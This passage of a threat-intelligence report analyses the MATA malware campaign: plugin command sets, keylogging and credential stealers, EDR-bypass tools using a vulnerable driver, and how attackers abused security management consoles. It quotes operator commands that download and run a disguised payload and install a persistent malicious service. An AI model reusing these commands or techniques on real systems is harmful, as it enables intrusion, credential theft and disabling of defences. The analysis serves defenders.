ordering to reach reliable data transmission\n\n“pipe” - implements active and passive connections between processes in local computer with\n```\n 1006\n```\nusing bi-directional Windows Named Pipe\n\nThere is also a hardcoded set of unnamed protocols that might be used on top of protocol stack\nfor connection to malicious proxy on another victim is started by command 502:\n\n1. Multi-staged connection handshake with XOR encryption data transfer\n\n2. Similar to #1 plus keys exchange, ed25519 signing and verifying random data on handshake\n\n3. Similar to #2 plus setup compression and RC4 encryption for the payload data transfer\n\nThe following two ed25519 keys are used for signature verification:\n\n19\n\n|ID|Description|\n|---|---|\n|1000|“raw” - The Raw protocol entity is implemented as an object like C++ base class the other protocols are inherited from. All protocols have the following set of methods (most important are listed): ● ActiveConnect ● PassiveListen ● PassiveAccept ● Send ● Recv All methods of “raw” protocol just forward call to underlying protocol in stack|\n|1001|“tcp” and “tcp6” - implements unencrypted active and passive connections on base of TCP version 4 and 6|\n|1002|“http” - implements active and passive connections by adding HTTP 1.1 headers to transferred data “https” - stacks “ssl” protocol above “http” “proxy_http” - stacks “raw” protocol above given “proxy_https” - implements HTTP proxy connection with Basic and NTLM authentication|\n|1003|“proxy_socks4” and “proxy_socks4a” - implements ActiveConnect method to establish connection via SOCKS proxy version 4 and 4a|\n|1004|“ssl” and “ssl3” - implements TLS ver 1.2 and ver 1.3 encrypted active and passive connections with help of statically linked wolfSSL library|\n|1005|“udp” and “udp6” - implements unencrypted active and passive connections on the base of UDP version 4 and 6. The dedicated thread cares about connection establishment and termination, missed packets resending and packets ordering to reach reliable data transmission|\n|1006|“pipe” - implements active and passive connections between processes in local computer with using bi-directional Windows Named Pipe|\n\n\n-----\n\n - 6E 98 0C 6B 8F 5F 70 5C 27 61 54 05 03 DF 64 C5 FA 28 92 5D 5A 94 6C 21 F7 7F 4F 00 B4\n11 E5 A1\n\n - B8 29 7D F4 02 42 32 EF 60 A3 80 23 91 4F 5D 12 61 9D AE E8 57 10 17 E9 B5 B2 9A 3F E0 A6\n45 0D\n\nFor example, the C2 configuration string\n“ssl://192.168.1[.]1:12345|!proto=udp;ssl://185.62.56[.]117:443” will cause the following\nprotocols stack:\n\nProtocol #3 from unnamed set (Multi-staged connection handshake with XOR encryption data\ntransfer, keys exchange, verify ed25519 signature of received keys, setup RC4 encryption key\nfor the following data transfer)\n\nProtocol #1 from unnamed set (Multi-staged connection handshake with XOR encryption data\ntransfer)\n\nssl - TLS1.2 encryption to underlying proxy server udp connection\n\nudp - to malicious proxy server at 192.168.1[.]1 on 12345\n\nThe configuration string part following the semicolon (ssl://185.62.56[.]117:443) will be sent to\na proxy server running on another victim with the same malware that had been started by\ncommand 502.\n\n**Mata generation 3 plugins**\n\nThere are seven embedded plugins with following commands set:\n\nPlugin#1 “Orchestrator” commands:\n\nCommand Description\n\n`100` Download and run commands plugin\n\n`101` Unload commands plugin\n\n`102` Download and run protocols plugin\n\n`103` Unload protocols plugin\n\n`104` Remove protocols set from the available protocols list\n\nRecon. Collect and send to C2 server following information:\n\n         - Victim ID\n\n`105`  - Three hardcoded unknown magic numbers (3, 0x780C2716, 0x846A9F5EA9E33D92)\n\n         - Results of offline commands execution (see details below)\n\n         - Computer and user names\n\n20\n\n|Command|Description|\n|---|---|\n|100|Download and run commands plugin|\n|101|Unload commands plugin|\n|102|Download and run protocols plugin|\n|103|Unload protocols plugin|\n|104|Remove protocols set from the available protocols list|\n|105|Recon. Collect and send to C2 server following information: ● Victim ID ● Three hardcoded unknown magic numbers (3, 0x780C2716, 0x846A9F5EA9E33D92) ● Results of offline commands execution (see details below) ● Computer and user names|\n\n\n-----\n\n|Col1|● Victim IP address ● Windows version ● Victim timezone|\n|---|---|\n|106|Returns current configuration settings|\n|107|Probe new C2 servers list and setup new configuration. Compress, encrypt and save into registry updated configuration settings|\n|108|Does nothing, returns empty results.|\n|109|Set offline commands execution duration|\n|110|Schedule offline command execution time. Save updated configuration settings.|\n|111|Set C2 server connections interval. Save updated configuration settings.|\n|112|Set victim ID. Save updated configuration settings.|\n|113|Probe and set a new C2 servers list. Save updated configuration settings.|\n|114|Returns current and parent process IDs|\n|115|Stop the malware execution|\n|116|Returns the list of currently executed tasks such as: ● Remote shells (by cmd 201) ● Directory listing (by cmd 314) ● Zip compress files and directories (by cmd 315) ● Run DLL (by cmd 405) ● Proxy server (by cmd 500, 502 and 505) ● ARP network scan (by cmd 2001) ● Hostnames resolving (by cmd 2008) ● Ping (by cmd 2003) ● TCP probes scan (by cmd 2002) ● Windows network shares scan (by cmd 2006)|\n|117|Terminate currently running task from the list in cmd 116|\n\n\n21\n\n\n-----\n\nPlugin#2 “Monitoring” commands:\n\nCommand Description\n```\n 1000\n 1001\n\n```\nprevious command 1001 execution\n```\n 1002\n 1003\n 1004\n 1005\n\n```\nPlugin#3 “Commander” commands:\n\nCommand Description\n```\n 200\n\n```\nRemote shell\n```\n 201\n\n```\nwith \"cmd /c start /b %s\n\nPlugin#4 “Files” commands:\n\n|Command|Description|\n|---|---|\n|1000|Returns list of logical drives has appeared since previous command 1000 execution|\n|1001|Returns error if number of active RDP sessions on victim computer has not grown since previous command 1001 execution|\n|1002 1003 1004 1005|These commands are reserved but not implemented|\n\n|Command|Description|\n|---|---|\n|200|Run process with redirected output, send results to C2 server|\n|201|Remote shell Connect to a random C2 server from the configured servers list and run the specified command with \"cmd /c start /b %s\" with input/output streams redirected to newly created connection. Optionally the shell process may be created with another user token.|\n\n|Command|Description|\n|---|---|\n|300|Returns list of logical drives or detailed list of files in specified folder|\n|301|Upload tail of the file or whole file if head was changed. Head of the file is verified with an MD5 hash|\n|302|Return to the C2 server MD5 hash and size of a file. Then download and append part to the file.|\n|303|Upload to C2 files have been modified|\n|304|Secure wipe file|\n|305|Copy creation, last access and last write timestamps from one file to another|\n|306|Create directory|\n|307|Remove files by name mask or remove directories tree|\n\n\n22\n\n\n-----\n\n|308|Count number of files, subdirectories and total size of directory|\n|---|---|\n|309|Copy file or directories recursively|\n|310|Move file or directories recursively|\n|311|Upload file to C2 server|\n|312|Upload file head to C2 server; Head size can be specified by number of lines or bytes.|\n|313|Upload file tail to C2 server. Tail size can be specified by number of lines or bytes. There is also the option to upload the middle part of the file like command “more” does.|\n|314|Recursively list files and directories in a dedicated thread, save results to the file|\n|315|Compress files and directories into ZIP file|\n\n\nPlugin#5 “Processes” commands:\n\nCommand Description\n```\n 400\n 401\n\n```\n`402` Kill process\n\n`403` Run process as user\n\n`404` Returns empty results\n```\n 405\n\n```\nPlugin#6 “Proxy” commands:\n\n|Command|Description|\n|---|---|\n|400|Returns detailed list of currently running processes with using WMI query|\n|401|Returns detailed list of currently running processes with using CreateToolhelp32Snapshot API|\n|402|Kill process|\n|403|Run process as user|\n|404|Returns empty results|\n|405|Download and reflective load DLL, run specified exported function in dedicated thread|\n\n|Command|Description|\n|---|---|\n|500|Active-active proxy. Connect to a random C2 server from the configured servers list on one side. Then TCP/UDP connect to an arbitrary host or another victim on the second side. Then forwards traffic between them.|\n|502|Passive-active proxy to C2 server with full protocols stack support. Listen for incoming connections on specified protocols stack on one side. Then connect with specified protocols stack to the C2 server on the second side. Then forwards traffic between them. A complicated multi staged handshake is used implemented as unnamed protocols 1-3 (see above in Protocols section)|\n\n\n23\n\n\n-----\n\n|505|Passive-active proxy. Listen for incoming TCP connection on one side. Then TCP/UDP connect to an arbitrary host on the second side. Then forwards traffic between them.|\n|---|---|\n\n\nPlugin#7 “NetRecon” commands:\n\nCommand Description\n\n`2000` Probe TCP connection to specified IP-address:port\n\nWrite to a file IPv4 to physical address mapping table (ARP table) obtained two ways:\n\n`2001`  - from Windows API GetIpNetTable\n\n         - by sending ARP requests to all IP addresses in given subnet\n\n`2002` Probe TCP connection to all IP addresses in given subnet, write results to a file\n\n`2003` Resolve host name (using gethostbyaddr API function) and ICMP ping all IP addresses in given\n\n`2008` subnet, write results to a file\n\n`2004` Netstat: list TCP endpoints available to the application, write results to a file\n\n`2006` Scan given subnet for available Windows shares, try to connect them with specified credentials\n\nThere are three subcommands:\n\n         - Return lists all current Windows shares connections\n```\n 2007\n\n```\n         - Connect to Windows share\n\n         - Disconnect Windows share\n\nAfter the embedded plugins initialization procedure in the main loop, the malware performs the\nfollowing tasks:\n\n - Run pre-configured process with “cmd /c %cmd%” command line.\n\n - Connects to C2 server.\n\n - Send to C2 server list of available Protocols and Commands plugins.\n\n - Receive and execute commands, send results back to C2 server.\n\n - After C2 disconnecting run another pre-configured process with “cmd /c %cmd%” command\nline.\n\n - Executes offline commands if configured. In this mode the malware waits for a specific\ntime, then during some long time (up to three days) repeats commands from the set of\ncommands provided by the plugins. This feature may be used for starting a proxy server or\nmaking screen/microphone recordings at some scheduled time.\n\n24\n\n|Command|Description|\n|---|---|\n|2000|Probe TCP connection to specified IP-address:port|\n|2001|Write to a file IPv4 to physical address mapping table (ARP table) obtained two ways: ● from Windows API GetIpNetTable ● by sending ARP requests to all IP addresses in given subnet|\n|2002|Probe TCP connection to all IP addresses in given subnet, write results to a file|\n|2003 2008|Resolve host name (using gethostbyaddr API function) and ICMP ping all IP addresses in given subnet, write results to a file|\n|2004|Netstat: list TCP endpoints available to the application, write results to a file|\n|2006|Scan given subnet for available Windows shares, try to connect them with specified credentials|\n|2007|There are three subcommands: ● Return lists all current Windows shares connections ● Connect to Windows share ● Disconnect Windows share|\n\n\n-----\n\n### Stealer\n\nUpon execution, the malware decodes its API names with a one-byte XOR (0xAA) and creates three\nthreads responsible for recording keystrokes, the clipboard and taking screenshots. This malware\ncontains two export functions: UnregService and UnregServiceWith.\n\nWhen the UnregService export function is invoked, it initiates the process of stealing capabilities\nwith default settings. By default, all stealing functionalities, including screenshot taking, are\nenabled and set to occur every 10 seconds.\n\nAlternatively, the UnregServiceWith export function can receive either two or five command line\nparameters, depending on the intended operation. When two parameters are given, the second\nparameter specifies the screenshot taking interval. However, when five parameters are passed,\nthe second parameter is still for the screenshot taking interval, and the remaining three\nparameters represent the flags for each stealing functionality, namely screenshot, keylogging, and\nclipboard stealing.\n\nTo signal a halt in the stealing routines, the malware uses the presence of the file named\n'%temp%~flag.db' as a stopping flag. Once this file is detected in the victim's system, all stealing\nfunctionalities are terminated.\n\nEncryption/\nStealing target Save path\ncompression method\n```\n          %temp%\\VSIXInstaller\n```\n`Screenshot` LZNT1 compression\n```\n          %04d%02d%02d%02d%02d%02d.TMP\n\n```\n`Keystroke` `%temp%\\~KInk.dat` 0xAA XOR\n\n`Clipboard` `%temp%\\~CPInk.DAT` 0xAA XOR\n\n### Screenshotter\n\nThe actor employed a variety of Stealers based on the circumstances. In some instances, they\nused malware that was only capable of capturing screenshots from the user's device.\n\nWhen this malware's AttachService export function is invoked, the malware takes a screenshot of\nthe user's screen, saving it to the c:\\users\\public path with the following format:\n\n - Screenshot file name: NTUSER.DAT{a298cd48-29ab-f018-87e1-%date-time%}.TM\n\n### Credential Stealer\n\nAlso, we observed different kinds of Stealers to exfiltrate stored credentials and cookies from the\nvictim.\n\n25\n\n|functionalities are|terminated.|Col3|\n|---|---|---|\n|Stealing target|Save path|Encryption/ compression method|\n|Screenshot|%temp%\\VSIXInstaller- %04d%02d%02d%02d%02d%02d.TMP|LZNT1 compression|\n|Keystroke|%temp%\\~KInk.dat|0xAA XOR|\n|Clipboard|%temp%\\~CPInk.DAT|0xAA XOR|\n\n\n-----\n\nOnce executed, the malware fetches credentials stored in Windows vaults. These credentials\ncould be browser stored credentials, domain credentials, and Windows credentials, as well as auto\nfilled credentials stored in HKEY_CURRENT_USER\\Software\\Microsoft\\Internet\n```\nExplorer\\IntelliForms\\Storage2.\n\n```\nThe stealer saves the collected credentials to the hard-coded file path: %temp%\\~IInk.DAT. The\nfollowing format is used to save this information:\n```\n [+] Password File Opening\n [\n    \"URL\": \"%s\",\n    \"Username\": \"%s\",\n    \"Password\": \"%s\",\n    \"Created Date\": \"%s\",\n    \"Prefereed\": \"%s\",\n    \"Times_used\": \"%s\"\n ]\n\n```\nAdditionally, the malware collects cookies from the victim. The directory path that stores cookie\nfiles is acquired from the registry key path:\n```\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell\nFolders\\Cookies. The stolen cookies are saved with the following format to the same file storing\n\n```\nthe collected credentials:\n```\n [+] Cookie File Opening\n [\n {\n    \"domain\": \"%s\",\n    \"expirationDate\": \"%s\",\n    \"hostOnly\": \"%s\",\n    \"httpOnly\": \"%s\",\n    \"name\": \"%s\",\n    \"path\" : \"%s\",\n    \"sameSite\": \"%s\",\n    \"secure\": \"%s\",\n    \"session\": \"%s\",\n    \"storeId\": \"%s\",\n    \"value\": \"%s\",\n    \"id\": \"%s\"\n },\n\n```\n26\n\n\n-----\n\n### EDR/Security bypass tools\n\nIn some cases, we observed the actor taking advantage of a public exploit to escalate privilege. It\n[seems the actor utilized the public CVE-2021-40449 exploit, which we discovered and reported](https://securelist.com/mysterysnail-attacks-with-windows-zero-day/104509/)\nin 2021.\n\n[Publicly available code called CallbackHell](https://github.com/ly4k/CallbackHell/) was used by this malware to elevate privileges and write\ninto the kernel's memory; The malware triggers the CVE-2021-40449 vulnerability, a use-after-free\nvulnerability, in Win32k’s NtGdiResetDC API.\n\nThis malware accepts one or two command line parameters. The first parameter is the command\nto execute with SYSTEM privileges from the code injected into the winlogon.exe process. The\nsecond optional parameter is the company name producer of antivirus/security suite products.\nThe malware checks all loaded drivers for their version information resource “CompanyName”,\nsearching for a given substring. Then the malware wipes pointers to the kernel callback routines\nrelated to process/thread creation, module loading. By modifying these callback routines, it makes\nendpoint security products unable to monitor the behavior properly. For that, the malware\ndisassembles the following ntoskrnl.exe APIs and finds related callbacks tables:\n```\n PsSetCreateProcessNotifyRoutine\n PsSetCreateThreadNotifyRoutine\n PsSetLoadImageNotifyRoutine\n\n```\nThe actor utilized multiple tools to interfere with endpoint products. In addition to the tool\nmentioned above, they also employed a different utility that utilized the Bring Your Own\nVulnerable Driver (BYOVD) technique to gain access to kernel memory addresses. It's possible that\nthe first tool failed to work properly on the victim machine, prompting the operator to bring in a\nsecond tool to bypass the behavior monitoring product. Ahnlab, a Korean security vendor,\n[published a comprehensive report about this technique. Furthermore, ESET](https://asec.ahnlab.com/en/38993/) [published](https://www.virusbulletin.com/uploads/pdf/conference/vb2022/VB2022-Kalnai-Havranek.pdf) the same\ntechnique abused by Lazarus.\n\nThe actor spawned this executable, providing it with two command-line parameters: the first is a\nvulnerable driver's file path and the second is the antivirus name to neutralize. If the product name\nis not specified, it selects the target from its own lists: kaspersky, ahnlab, doctor web, bitdefender,\navira, avast, mcafee, fortinet, eset.\n\nFig. 6 Target Anti-Virus list\n\n27\n\n\n-----\n\nSimilar to the previous tool, this utility also checks for the presence of an antivirus software by the\n\"CompanyName\" attribute, uses the same disassembler, and clears the same set of kernel\ncallbacks. However, the key distinction is that this tool employs a vulnerable driver to execute the\ninitial write to kernel memory addresses. This tool is equipped with a library capable of working with\nthree different vulnerable drivers, and the specific driver is selected based on the DriverID value. In\nthis instance, the DriverID value 110 has been utilized.\n\nFig. 7 Select Device IOCTL codes to be emitted into vulnerable driver by DriverID\n\nUnfortunately, we were not able to acquire the file. However, this sample attempts to work with an\nEneIo or EneIo64 device name, which means it probably attempts to load ene.sys driver developed\n[by \"ENE Technology\". According to Ahnlab's report, the Enelo driver is capable of accessing kernel](http://www.ene.com.tw/index-en.php)\nphysical memory and I/O port directly and it has a vulnerable mechanism to verify the source that\ncalls its functionality. While other vendors have described a rootkit that disables multiple behavior\nmonitoring features such as Registry callback, Object callback, Process-related callback, File\nsystem callback, Windows Filtering Platform (WFP) callback, and Event Tracing for Windows\n(ETW) callback, the newly discovered malware specifically targets security products by modifying\n\n28\n\n\n-----\n\nthe callback tables of certain APIs. It wipes the callback addresses of process/thread creation and\nmodule loading callbacks, thereby disrupting the functionality of security products.\n\nIt is important to note that we have added the ability to prevent the exploitation of EneIo\nvulnerable drivers to our products.\n\n### Command file tool\n\nThe malware waits in an endless loop for the file C:\\Windows\\Temp\\TMPA93840.tmp to appear. Once\nfound, it reads the first line of the file and checks if it begins with one of the command keywords\nlisted below. After that, the malware immediately deletes the command file.\n\nThe following command keywords are supported:\n\nCommand Description\n\n`zip` Handler for this command is not implemented\n\nUpload file.\n\nSend to specified server SSL/DTLS encrypted message in following form:\n```\n         POST /upload HTTP/1.1\n         Host: %host%:%port%\n         Content-Length: 1254\n         Origin: https://%host%:%port%\n         Content-Type: multipart/form-data; boundary=---         WebKitFormBoundary%16randomAlphaNum%\n         ------WebKitFormBoundary%16randomAlphaNum%\n up\n         Content-Disposition: form-data; name=\"Upload\"\n         100000\n         ------WebKitFormBoundary%16randomAlphaNum%\n         Content-Disposition: form-data; name=\"Upload\"; filename=\"{%timestamp%         %4randomDigits%.dmp}\"\n         Content-Type: application/x-object\n         ------WebKitFormBoundary%16randomAlphaNum%-\n```\nThe reply for the request is line specifying name, starting offset, full size, chunk size, sleep time\nbetween chunks of the file to be uploaded to server.\n\nDownload file.\n\nSend to specified server SSL/DTLS encrypted message in following form:\n```\n         POST /download HTTP/1.1\n dn Host: %host%:%port%\n         Content-Length: 1254\n         Origin: https://%host%:%port%\n         Content-Type: multipart/form-data; boundary=---         WebKitFormBoundary%16randomAlphaNum%\n\n```\n29\n\n|Command|Description|\n|---|---|\n|zip|Handler for this command is not implemented|\n|up|Upload file. Send to specified server SSL/DTLS encrypted message in following form: POST /upload HTTP/1.1 Host: %host%:%port% Content-Length: 1254 Origin: https://%host%:%port% Content-Type: multipart/form-data; boundary=---- WebKitFormBoundary%16randomAlphaNum% ------WebKitFormBoundary%16randomAlphaNum% Content-Disposition: form-data; name=\"Upload\" 100000 ------WebKitFormBoundary%16randomAlphaNum% Content-Disposition: form-data; name=\"Upload\"; filename=\"{%timestamp%- %4randomDigits%.dmp}\" Content-Type: application/x-object ------WebKitFormBoundary%16randomAlphaNum%-- The reply for the request is line specifying name, starting offset, full size, chunk size, sleep time between chunks of the file to be uploaded to server.|\n|dn|Download file. Send to specified server SSL/DTLS encrypted message in following form: POST /download HTTP/1.1 Host: %host%:%port% Content-Length: 1254 Origin: https://%host%:%port% Content-Type: multipart/form-data; boundary=---- WebKitFormBoundary%16randomAlphaNum%|\n\n\n-----\n\n|Col1|------WebKitFormBoundary%16randomAlphaNum% Content-Disposition: form-data; name=\"Download\" 100000 ------WebKitFormBoundary%16randomAlphaNum% Content-Disposition: form-data; name=\"download\"; filename=\"{%timestamp%- %4randomDigits%.dmp}\" Content-Type: application/x-object ------WebKitFormBoundary%16randomAlphaNum%-- The reply for the request is line specifying name, full size, chunk size, sleep time between chunks of the file to be downloaded from the server.|\n|---|---|\n|bb|Exit|\n\n\nThe malware records every executed command in an informative log file:\n```\nC:\\Windows\\Temp\\TMPB08634.tmp. \n\n```\nAnalyzing this log file tells us that a malicious C2 server was deployed within the victim's LAN.\nAccording to timestamps this tool was compiled just a few minutes before its usage.\n```\n {2022-10-13 10:08} [INFO] CMD_FILE C:\\Windows\\Temp\\TMPA93840.tmp\n {2022-10-13 10:08}\n ==================================================================\n {2022-10-13 10:08} [READING CMD] ...\n {2022-10-13 10:08} [DELETE] CMD_FILE\n {2022-10-13 10:08} [UP] 192.168.[redacted]:110\n {2022-10-13 10:08} [TRANS] Starting\n {2022-10-13 10:08} [UP] Connect\n {2022-10-13 10:08} [ERROR] recv config\n {2022-10-13 10:08} [UP] End\n\n## Incident investigation\n\n```\nAs our investigation progressed, we found more malware samples, obtained new Indicators of\nCompromise, and identified more compromised systems.\n\nA turning point in the investigation was the discovery of two MATA samples that had internal IP\naddresses set as C2 server addresses. Attackers often create a chain of proxy servers within a\ncorporate network to communicate between the malware and the control server, for example, if\nthe infected system does not have direct access to the internet. Of course, we have seen this\nbefore, but in this case the malware configuration included IP addresses from a subnet we were\nunfamiliar with at the time, which caught our attention.\n\n\n30\n\n\n-----\n\nWe immediately notified the affected organization of the likely compromise of systems with these\nIP addresses and received a swift response.\n\nStarting to investigate this case, we realized that the compromised systems were financial\nsoftware servers and that these servers provided network access to several dozen subsidiaries of\nthe targeted organization. At that point, we realized the compromise of one plant's domain\ncontroller was just the tip of the iceberg.\n\nAs we continued our investigation, we found that the attackers started the attack from the\nfactory, using a phishing email as described above, and progressed through the network until they\ndiscovered the shortcut of an RDP connection to the parent company's terminal server. Using the\nutilities described in the next chapter, they acquired the user's credentials and connected to the\nterminal server.\n\nAfter that, attackers repeated everything they had done at the attacked plant, but this time on\nthe scale of the entire parent company. Using a vulnerability in a legitimate driver and a rootkit,\nthey interfered with the antivirus, intercepted user credentials (many of which were cached on the\nterminal server, including accounts with administrator privileges on many systems), and began\nactively moving around the network.\n\nNaturally, this led to the parent company's domain controller being compromised and control being\ngained over even more workstations and servers. But the attackers did not stop there. Next, they\nwere able to access the control panels of two security solutions simultaneously.\n\nFirst, they got control over a solution for checking the compliance of systems with information\nsecurity requirements by exploiting one of its vulnerabilities. Second, with the help of this security\nsolution, they managed to get access to the control panel of the endpoint protection solution that\nhad not been securely configured.\n\nIn both cases, security solutions were used by attackers to gather information about the targeted\norganization's infrastructure and to distribute malware, as both systems have the capability to\ndeploy and execute files remotely.\n\nAs a result, taking over centralized systems for managing security solutions allowed the attackers\nto spread the malware to multiple subsidiaries at once (connected to the compliance security\nsolution), as well as infect Linux-variant MATA servers running Unix-like systems that they couldn't\naccess even after gaining full control of the organization's domain.\n\n## Technical details – part 2. In-the-field analysis results\n\nUltimately, the attackers were able to gain access to the domain controller and the management\ninterfaces of two security solutions at the same time.\n\n31\n\n\n-----\n\n### Linux MATA generation 3\n\nWe've also seen identical ELF malware on several paths including an anti-malware solution control\nserver and Linux hosts. Therefore, we strongly believe that this malware was delivered by security\nsolution’s remote installation functionality.\n\nThe Linux version has very similar capability to the third generation MATA Windows version, and\nseems to have been built from the same sources.\n\nThe decrypted configuration contains a file path (/usr/share/man/man1/xver-user.2.gz) where the\nconfiguration settings are saved. Files paths suggest that the attacker has root access to the\ncompromised system.\n\nThe configuration also contains several C2 addresses. Note that it contains an internal IP address,\nwhich means the actor configured a C2 proxy server in the victim's network.\n\n - `ssl://10.0.1[redacted]:5353;ssl://185.25.50[.]199`\n\n - `ssl://10.0.1[redacted]:5353;ssl://85.239.33[.]250`\n\n### Discovery\n\nAfter gaining control over the victim's device, the actor proceeded to gather basic information\nusing Windows commands. The actor inquired for the user name, checked the Windows update\nstatus, and examined the network status. Notably, some of the commands contained typos,\nsuggesting that they were manually typed by the operator. The mistakenly entered commands are\nhighlighted in bold:\n```\n cmd.exe /c \"query user\"\n cmd.exe /c \"reg query \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\"\n cmd.exe /c \"ping -n 1 -a 192.168.[redacted]\"\n cmd.exe /c \"net_view \\\\192.168.[redacted]\"\n cmd.exe /c \"netstat -ano | find \"TCP\"\"\n cmd.exe /c tipconfig\n\n### Lateral movement\n\n```\nThe attackers also tried to get the passwords of users who logged into the compromised system.\nTo do this, they used a tool that shows account password hashes cached in memory:\n\n32\n\n\n-----\n\nFig. 8 Credentials harvesting tool\n\nSubsequently, the attackers launched a password brute-force attack, exploiting the lack of rigor in\nthe password policies implemented on many accounts. This enabled them to gain access to\nnumerous accounts in a relatively short period of time.\n\nFollowing the network scanning, the operator established a connection to a remote host using a\nstolen credential. Utilizing Windows Management Instrumentation (WMI), the actor created a new\nWindows service that would automatically run malware on the system. The malware was then\ncopied onto the host.\n\nNotably, the actor took steps to conceal their activities by installing the malicious service:\n```\n cmd.exe /c \"sc query <service_name>\"\n cmd.exe /c reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\n NT\\CurrentVersion\\Svchost\" /v \"<service_name>\" /t REG_MULTI_SZ /d \"<service_name>\" /f\n cmd.exe /c reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\<service_name>\"\n /f\n cmd.exe /c reg add\n \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\<service_name>\\Parameters\" /f\n cmd.exe /c reg add\n \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\<service_name>\\Parameters\" /v\n \"ServiceDll\" /t REG_EXPAND_SZ /d \"%system32%\\<service_name>.dll\" /f\n cmd.exe /c sc create <service_name> binPath= \"%system32%\\svchost.exe -k <service_name>\"\n displayname= \"vii system logical assist\" start= \"auto\"\n cmd.exe /c \"sc failure <service_name> reset= 86400 actions=\n restart/60000/restart/60000/restart/60000\"\n\n### Abusing security compliance solution\n\n```\nDuring the course of our investigation, we discovered that the operator had successfully bruteforced the password for a technical account that held administrator privileges for a security\nsolution used to verify compliance with the company's information security policies. This account\n\n33\n\n\n-----\n\nwas supposed to have been disabled once the solution was configured, but its existence had been\noverlooked. Following the attack, the operator deleted the server logs of the security solution in\nan attempt to cover his traces. However, we were able to recover partial activity logs from the\nsolution's database.\n\nOnce the operators had compiled a list of targeted systems, they leveraged the embedded EDR\nfunctionality of the compliance solution. They first obtained a screenshot of the attacked\nsystem's screen contents, then proceeded to determine the optimal channel for exfiltrating data\nfrom the system. Since many of the compromised systems were on restricted networks without\ninternet access, the operator executed various commands to explore potential network access\nroutes from the attacked system to other infected systems, with the objective of constructing a\nchain of proxy servers for data exfiltration:\n```\n Test-Connection 10.0.[redacted] -Count 1\n ping.exe -n 1 10.43.[redacted]\n Test-NetConnection 10.0.[redacted] -Port 80 -InformationLevel Quiet\n Test-NetConnection 10.0.[redacted]-Port 1323 -InformationLevel Quiet\n Test-NetConnection 10.0.[redacted] -Port 5432 -InformationLevel Quiet\n netstat -ano\n ipconfig /all\n type C:\\Windows\\System32\\drivers\\etc\\hosts\n Test-NetConnection 10.0.[redacted] -Port 80 -InformationLevel Quiet\n Try\n {\n   $encoding = new-object system.text.asciiencoding\n   $data = $encoding.GetBytes(\"hello\") \n   $UDPCLient = New-Object -TypeName System.Net.Sockets.UdpClient\n   $UDPCLient.Connect(\"10.0.[redacted]\", 1323)\n   $UDPCLient.Send($data,$data.length)\n }\n Catch \n {\n   Write-Host \"Connection failed\"\n }\n\n```\nThe ability to run arbitrary PowerShell scripts through this compliance solution allowed the\nattacker not only to discover the network configuration of the attacked systems, but also to\nexecute a command to download and run the MataDoor malware. The malware was downloaded\nfrom a previously infected system, to which the targeted system had network access. Typically,\nthe initial download involved a MataDoor executable file disguised as a PNG image, which was\nsaved as a .dat file and then executed using the command line. In some instances, the operator\nopted to directly download the loader module as an executable file, and launched it using\nPowerShell:\n\n34\n\n\n-----\n\n```\n (New-Object Net.WebClient).DownloadFile('http://10.0.[redacted]/iisstart.png',\n 'c:\\users\\public\\libraries\\library-ms.dat')\n cmd.exe /c c:\\users\\public\\libraries\\library-ms.dat\n (New-Object Net.WebClient).DownloadFile('http://10.0.[redacted]/iisstart.png',\n 'c:\\users\\public\\libraries\\library-ms.exe')\n powershell.exe -ep bypass -w 1 \"c:\\users\\public\\libraries\\library-ms.exe\"\n\n```\nImmediately after installing the malware, the attackers removed the loader module:\n```\n del c:\\users\\public\\libraries\\library-ms.exe\n dir c:\\users\\public\\libraries; Remove-Item \"c:\\users\\public\\libraries\\library-ms.exe\"\n\n```\nDuring our research, we uncovered two vulnerabilities in the security solution discussed in this\nchapter. First, the solution allowed using the weak passwords like \"123456\" or \"qwerty\", second, the\npasswords have been stored inside log files as plain text. Specifically, whenever a user changed\ntheir password, their login credentials and new password were written to the log file in clear text.\nConsequently, if an attacker gained access to the log file, all user accounts would be\ncompromised.\n\nWe promptly notified the solution's developer of the identified vulnerabilities. Nevertheless, this\nincident serves as a reminder that software vendors, especially those that develop security\nsolutions, must pay greater attention to ensuring their code adheres to industry-standard best\npractices for software development.\n\n### Abusing the anti-malware solution\n\nBy launching the malware via a trusted process, coupled with the techniques discussed in the EDR\nbypass tool chapter, the attackers managed to run the malware, subsequently gaining access to\nthe anti-malware software control server.\n\nFirst, they were trying to get the local administrator credentials (that were needed to get access\nto the control panel) by installing malware with the use of domain user credentials stolen at a\nprevious attack stage. That attempt was blocked by the endpoint protection solution\nsafeguarding its own control server. After that with the help of the security compliance solution\nthey took control over before, they manage to drop and load the vulnerable driver (explained\nabove) that rendered endpoint protection ineffective, dropped the malware, stole local admin\ncredentials and finally, accessed the endpoint protection solution central control panel.\n\nAs with other centralized management solutions for IT and security systems, a compromised\nserver provides extensive capabilities to control and deploy policies, updates, and programs to\nremote devices. In this case, we discovered a package that contained Linux ELF malware, along\nwith a configuration file that detailed how to install the package, including which file to execute\n\n35\n\n\n-----\n\nduring deployment. We also found that Windows versions of the malware were distributed from\nthe same host.\n\nThe parent process that spawned MataDoor was a legitimate security solution agent, indicating\nthat the above-mentioned Windows malware was explicitly distributed by the anti-malware\nproduct. Additionally, we found another victim within the same corporation compromised by the\nMATA malware, although executed via Windows task scheduler. We believe that this malware\ncould be delivered by an anti-malware solution as well.\n\nWe've seen that the actor created a DLL file and a PowerShell script to install the next stage\npayload using the above MataDoor malware:\n\n - DLL payload path: C:\\Windows\\system32\\secmond.dll\n\n - Powershell script: C:\\Windows\\system32\\trace.ps1\n\nThe DLL file is a Loader which loads MATA, while the PowerShell script is responsible for\nregistering the Loader as a Windows service and executing it.\n\nFinally, we observed that the attacker utilized a specialized utility to gain access to the database\nof the anti-malware solution and extract information regarding the organization's infrastructure.\nThrough a SQL query, the operator obtained a list of software installed on the workstations, which\ncould potentially be used to identify suitable programs to disguise malware as. This use of a\nspecialized utility suggests a high level of familiarity with the anti-malware solution employed by\nthe organization, indicating that the attack was meticulously planned and executed with precision.\n\n## Interesting findings\n\nAs our investigation was nearing completion and we had a good look at almost all stages of the\nattack, we managed to find two more very interesting files.\n\nThe first turned out to be a special malware module designed to send commands to the infected\nsystem via removable media. The same module is also responsible for 